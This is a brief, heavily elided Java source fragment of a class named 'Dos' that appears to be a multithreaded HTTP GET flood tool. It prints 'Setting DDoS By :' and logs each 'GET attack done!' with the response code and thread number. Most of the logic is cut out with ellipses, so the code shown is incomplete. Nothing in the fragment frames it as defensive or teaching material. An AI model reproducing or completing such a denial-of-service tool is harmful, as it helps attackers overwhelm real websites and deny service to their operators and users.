import java.io.*;import java.util.ArrayList;import java.util.Scanner;import java.net.*;import javax.net.ssl.HttpsURLConnection;
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Setting DDoS By :");
    ...
    private void getAttack(String url) throws Exception {
        ...
        int Root41z = con.getResponseCode();
        System.out.println("GET attack done!: " + Root41z + "Thread: " + this.seq);
    }
